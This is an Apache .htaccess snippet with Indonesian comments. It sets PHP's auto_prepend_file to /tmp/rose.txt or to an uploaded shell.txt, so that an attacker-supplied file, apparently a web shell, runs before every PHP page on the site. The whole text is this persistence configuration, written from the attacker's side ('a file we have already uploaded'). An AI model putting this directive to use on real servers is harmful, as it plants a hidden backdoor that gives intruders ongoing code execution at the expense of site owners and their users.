php_value auto_prepend_file /tmp/rose.txt
# atau file lain yang sudah kita upload di dir ini:
# php_value auto_prepend_file shell.txt
